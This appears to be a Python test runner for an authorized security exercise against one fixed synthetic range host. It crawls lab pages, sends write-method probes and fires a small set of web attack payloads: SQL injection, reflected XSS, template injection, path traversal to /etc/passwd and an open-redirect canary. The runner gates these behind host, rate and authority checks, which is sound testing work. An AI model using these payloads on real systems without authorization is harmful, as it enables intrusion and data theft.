#!/usr/bin/env python3
"""Continuous adversarial exercise for the explicitly authorized synthetic range.

The target host is intentionally fixed. This runner does not accept arbitrary targets.
It performs normal-rate crawling, query mutation, known weak-surface checks, client-side
credential exposure checks, synthetic write-method probes, and a deliberately small
active-exploit pilot.

The active-exploit pilot is narrower than the baseline exercise: GET only, exact host
only, at most two probes per run, at most 1 request/second, and a deterministic 20%
selection from a fixed non-destructive canary suite. Before any active-exploit request,
the runner re-checks the current effective Authority ceiling and requires this exact host
to retain GET authority. Redirects are revalidated before following so an authorized
page cannot bounce the pilot to an unapproved hostname.
"""
from __future__ import annotations

import hashlib
import json
import os
import time
import urllib.error
import urllib.parse
import urllib.request
from pathlib import Path

BASE = "https://kabeya-authorized-test-range.onrender.com"
AUTHORIZED_HOST = "kabeya-authorized-test-range.onrender.com"
MAX_RPS = 10.0
TIMEOUT = 15

ACTIVE_EXPLOIT_ROLLOUT_PERCENT = 20
MAX_ACTIVE_EXPLOIT_PROBES = 2
ACTIVE_EXPLOIT_MAX_RPS = 1.0
ACTIVE_EXPLOIT_MAX_RESPONSE_BYTES = 128 * 1024
AUTHORITY_STATE_PATH = Path(__file__).resolve().parents[1] / "state" / "owner_contact_ceiling_effective.json"

READ_PATHS = [
    "/",
    "/scope.json",
    "/ai.txt",
    "/.well-known/security.txt",
    "/lab/index.html",
    "/lab/nullharbor.html?role=admin&debug=1",
    "/lab/embermesh.html?id=0",
    "/lab/embermesh.html?id=1",
    "/lab/atlaspaper.html",
    "/lab/lumenclause.html?q=%27%22%3C%3E%26",
    "/lab/orbitnotes.html",
    "/lab/archive-demo.txt",
    "/login-lab/",
    "/login-lab/app.js",
    "/login-lab/data.json",
]

WRITE_PROBES = [
    ("POST", "/contact/index.html", b"name=senju-test&message=synthetic-only"),
    ("PUT", "/login-lab/synthetic-records/senju-probe", b'{"synthetic":true,"source":"senju"}'),
    ("PATCH", "/login-lab/synthetic-records/senju-probe", b'{"synthetic":true,"note":"mutation-probe"}'),
    ("DELETE", "/login-lab/synthetic-records/senju-probe", None),
]

# Ten bounded candidates -> two selected per run = exactly 20% of the suite.
# Observation-oriented canaries only: no credential guessing, persistence,
# destructive mutation, shell callback, or out-of-band exfiltration.
ACTIVE_EXPLOIT_PROBES = [
    {"name": "sqli_boolean_true", "path": "/lab/embermesh.html?id=1%27%20OR%20%271%27%3D%271%27--", "class": "sqli"},
    {"name": "sqli_boolean_false", "path": "/lab/embermesh.html?id=1%27%20AND%20%271%27%3D%272%27--", "class": "sqli"},
    {"name": "sqli_union_null", "path": "/lab/embermesh.html?id=-1%20UNION%20SELECT%20NULL--", "class": "sqli"},
    {"name": "reflected_xss_svg", "path": "/lab/lumenclause.html?q=%3Csvg%2Fonload%3Dalert%28%27SENJU_XSS_CANARY_1337%27%29%3E", "class": "xss"},
    {"name": "reflected_xss_img", "path": "/lab/lumenclause.html?q=%3Cimg%20src%3Dx%20onerror%3Dalert%28%27SENJU_XSS_CANARY_1337%27%29%3E", "class": "xss"},
    {"name": "ssti_jinja_canary", "path": "/lab/orbitnotes.html?template=%7B%7B1337*2%7D%7D", "class": "ssti"},
    {"name": "ssti_dollar_canary", "path": "/lab/orbitnotes.html?template=%24%7B1337*2%7D", "class": "ssti"},
    {"name": "path_traversal_plain", "path": "/lab/archive-demo.txt?file=..%2F..%2F..%2F..%2Fetc%2Fpasswd", "class": "path_traversal"},
    {"name": "path_traversal_double_encoded", "path": "/lab/archive-demo.txt?file=..%252F..%252F..%252F..%252Fetc%252Fpasswd", "class": "path_traversal"},
    {"name": "open_redirect_canary", "path": "/lab/nullharbor.html?next=https%3A%2F%2Fexample.invalid%2Fsenju-canary", "class": "redirect"},
]


def assert_authorized(url: str) -> None:
    parsed = urllib.parse.urlsplit(url)
    if parsed.scheme != "https" or (parsed.hostname or "").lower() != AUTHORIZED_HOST:
        raise RuntimeError(f"refusing out-of-scope URL: {url}")


def current_active_exploit_authority(state_path: str | Path = AUTHORITY_STATE_PATH) -> dict:
    path = Path(state_path)
    try:
        raw = json.loads(path.read_text(encoding="utf-8"))
    except (OSError, json.JSONDecodeError, TypeError) as exc:
        raise RuntimeError(f"active exploit Authority state unavailable: {type(exc).__name__}") from exc
    if not isinstance(raw, dict) or not isinstance(raw.get("ceiling"), dict):
        raise RuntimeError("active exploit Authority state is malformed")
    ceiling = raw["ceiling"]
    exact_hosts = {str(host).strip().lower().rstrip(".") for host in ceiling.get("exact_hosts", [])}
    per_host = ceiling.get("per_host_methods", {})
    methods = set()
    if isinstance(per_host, dict):
        methods = {str(method).strip().upper() for method in per_host.get(AUTHORIZED_HOST, [])}
    if not methods:
        methods = {str(method).strip().upper() for method in ceiling.get("allowed_methods", [])}
    approved = (
        AUTHORIZED_HOST in exact_hosts
        and "GET" in methods
        and ceiling.get("allow_http") is False
        and ceiling.get("allow_delete") is False
    )
    return {
        "approved": approved,
        "host": AUTHORIZED_HOST,
        "methods": sorted(methods),
        "allow_http": bool(ceiling.get("allow_http", False)),
        "allow_delete": bool(ceiling.get("allow_delete", False)),
        "ceiling_id": str(ceiling.get("ceiling_id", "")),
        "state_path": str(path),
    }


def require_active_exploit_authority(state_path: str | Path = AUTHORITY_STATE_PATH) -> dict:
    authority = current_active_exploit_authority(state_path)
    if not authority["approved"]:
        raise RuntimeError(
            "active exploit blocked: exact host lacks current effective GET Authority"
        )
    return authority


class _SameAuthorizedHostRedirectHandler(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, req, fp, code, msg, headers, newurl):
        assert_authorized(newurl)
        return super().redirect_request(req, fp, code, msg, headers, newurl)


OPENER = urllib.request.build_opener(_SameAuthorizedHostRedirectHandler())


def request(method: str, path: str, body: bytes | None = None, *, extra_headers: dict[str, str] | None = None, max_response_bytes: int = 1024 * 1024) -> dict:
    url = urllib.parse.urljoin(BASE + "/", path.lstrip("/"))
    assert_authorized(url)
    headers = {"User-Agent": "Senju-Authorized-Range-Exercise/1.1", "X-Senju-Test": "synthetic-authorized-range"}
    if extra_headers:
        headers.update(extra_headers)
    if body is not None:
        headers["Content-Type"] = "application/json" if body.startswith(b"{") else "application/x-www-form-urlencoded"
    req = urllib.request.Request(url, data=body, headers=headers, method=method)
    started = time.time()
    try:
        with OPENER.open(req, timeout=TIMEOUT) as res:
            data = res.read(max_response_bytes)
            status = res.status
            final_url = res.geturl()
    except urllib.error.HTTPError as exc:
        data = exc.read(max_response_bytes)
        status = exc.code
        final_url = exc.geturl()
    elapsed_ms = round((time.time() - started) * 1000, 1)
    assert_authorized(final_url)
    text = data.decode("utf-8", errors="replace")
    lowered = text.lower()
    return {
        "method": method,
        "url": url,
        "status": status,
        "elapsed_ms": elapsed_ms,
        "bytes": len(data),
        "sha256": hashlib.sha256(data).hexdigest(),
        "signals": {
            "flag_marker": "FLAG{" in text,
            "demo_email_exposed": "redteam@example.test" in text,
            "demo_password_exposed": "lab-pass-314" in text,
            "static_token_exposed": "DEMO_ATLAS_0000_NOT_A_SECRET" in text,
            "authorization_policy_present": "AUTHORIZED" in text.upper(),
            "sql_error_marker": any(marker in lowered for marker in ("sql syntax", "sqlite error", "postgresql", "mysql error", "unclosed quotation")),
            "xss_canary_reflected": "SENJU_XSS_CANARY_1337" in text,
            "ssti_canary_evaluated": "2674" in text,
            "passwd_marker": "root:x:" in lowered or "root:*:" in lowered,
        },
    }


def _probe_rank(seed: str, probe: dict) -> str:
    return hashlib.sha256(f"{seed}|{probe['name']}|{probe['path']}".encode("utf-8")).hexdigest()


def selected_active_exploit_probes(seed: str) -> list[dict]:
    desired = max(1, (len(ACTIVE_EXPLOIT_PROBES) * ACTIVE_EXPLOIT_ROLLOUT_PERCENT) // 100)
    budget = min(MAX_ACTIVE_EXPLOIT_PROBES, desired)
    return sorted(ACTIVE_EXPLOIT_PROBES, key=lambda probe: _probe_rank(seed, probe))[:budget]


def run_active_exploit_pilot(seed: str) -> dict:
    authority = require_active_exploit_authority()
    selected = selected_active_exploit_probes(seed)
    interval = 1.0 / ACTIVE_EXPLOIT_MAX_RPS
    results: list[dict] = []
    for index, probe in enumerate(selected):
        try:
            observation = request("GET", str(probe["path"]), extra_headers={"X-Senju-Active-Exploit": "bounded-nondestructive-v1", "X-Senju-Probe-Class": str(probe["class"])}, max_response_bytes=ACTIVE_EXPLOIT_MAX_RESPONSE_BYTES)
            results.append({"name": probe["name"], "class": probe["class"], "attempted": True, "error": None, **observation})
        except Exception as exc:
            results.append({"name": probe["name"], "class": probe["class"], "attempted": True, "method": "GET", "url": urllib.parse.urljoin(BASE + "/", str(probe["path"]).lstrip("/")), "error": f"{type(exc).__name__}: {str(exc)[:240]}", "signals": {}})
        if index < len(selected) - 1:
            time.sleep(interval)
    signal_hits = {
        "sql_error_marker": sum(1 for row in results if row.get("signals", {}).get("sql_error_marker")),
        "xss_canary_reflected": sum(1 for row in results if row.get("signals", {}).get("xss_canary_reflected")),
        "ssti_canary_evaluated": sum(1 for row in results if row.get("signals", {}).get("ssti_canary_evaluated")),
        "passwd_marker": sum(1 for row in results if row.get("signals", {}).get("passwd_marker")),
    }
    return {
        "enabled": True,
        "mode": "fixed_exact_host_bounded_live",
        "rollout_percent": ACTIVE_EXPLOIT_ROLLOUT_PERCENT,
        "candidate_probe_count": len(ACTIVE_EXPLOIT_PROBES),
        "selected_probe_count": len(selected),
        "max_probes_per_run": MAX_ACTIVE_EXPLOIT_PROBES,
        "max_rps": ACTIVE_EXPLOIT_MAX_RPS,
        "methods": ["GET"],
        "credential_use": False,
        "destructive": False,
        "persistence": False,
        "out_of_band_callback": False,
        "exact_host_only": True,
        "authority_gate": authority,
        "selected_probe_names": [str(row["name"]) for row in selected],
        "results": results,
        "signal_hits": signal_hits,
    }


def main() -> int:
    interval = 1.0 / MAX_RPS
    observations: list[dict] = []
    for path in READ_PATHS:
        observations.append(request("GET", path))
        time.sleep(interval)
    for method, path, body in WRITE_PROBES:
        observations.append(request(method, path, body))
        time.sleep(interval)
    run_seed = os.environ.get("SENJU_ACTIVE_EXPLOIT_SEED", "").strip() or str(int(time.time() // 1800))
    active_exploit = run_active_exploit_pilot(run_seed)
    report = {
        "schema": "senju-authorized-range-assault/v2",
        "target": BASE,
        "authorization": "fixed-owner-authorized-synthetic-range",
        "request_count": len(observations) + int(active_exploit["selected_probe_count"]),
        "baseline_request_count": len(observations),
        "observations": observations,
        "active_exploit": active_exploit,
        "summary": {
            "flag_surfaces": sum(1 for x in observations if x["signals"]["flag_marker"]),
            "demo_credentials_exposed": any(x["signals"]["demo_email_exposed"] or x["signals"]["demo_password_exposed"] for x in observations),
            "static_token_exposed": any(x["signals"]["static_token_exposed"] for x in observations),
            "write_methods_accepted_2xx": [x["method"] for x in observations if x["method"] in {"POST", "PUT", "PATCH", "DELETE"} and 200 <= x["status"] < 300],
            "active_exploit_attempted": active_exploit["selected_probe_count"],
            "active_exploit_rollout_percent": ACTIVE_EXPLOIT_ROLLOUT_PERCENT,
            "active_exploit_authority_approved": active_exploit["authority_gate"]["approved"],
            "active_exploit_signal_hits": active_exploit["signal_hits"],
        },
    }
    Path("authorized-range-assault-report.json").write_text(json.dumps(report, ensure_ascii=False, indent=2) + "\n", encoding="utf-8")
    print(json.dumps(report["summary"], ensure_ascii=False, indent=2))
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
